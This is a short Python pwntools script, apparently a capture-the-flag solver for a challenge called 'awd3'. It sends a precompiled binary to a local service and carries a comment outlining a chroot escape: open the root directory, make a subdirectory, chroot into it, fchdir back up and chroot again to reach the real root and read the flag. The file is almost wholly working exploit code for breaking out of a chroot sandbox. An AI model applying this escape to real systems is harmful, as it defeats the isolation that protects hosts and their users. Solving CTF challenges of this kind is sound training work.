#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#io = process('./awd3')
'''
$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep -E "mkdir|chroot|fchdir"
#define __NR_fchdir 81
#define __NR_mkdir 83
#define __NR_chroot 161
'''
# open / -> fchdir / -> mkdir subdir -> chroot /subdir/ -> fchdir ../../ -> chroot . -> cat flag

def runbin(lenth, data, arg):
    io.sendlineafter('len?\n', str(lenth))
    io.sendlineafter('data?\n', data)
    io.sendlineafter('elf?\n', arg)

if __name__ == '__main__':
    io =remote("localhost",9999)
    f = open('./exploit', 'rb')

    payload = f.read()
    runbin(len(payload)+1, payload, '')
    print(io.recvuntil('[*] setting chroot').decode())
    io.close()
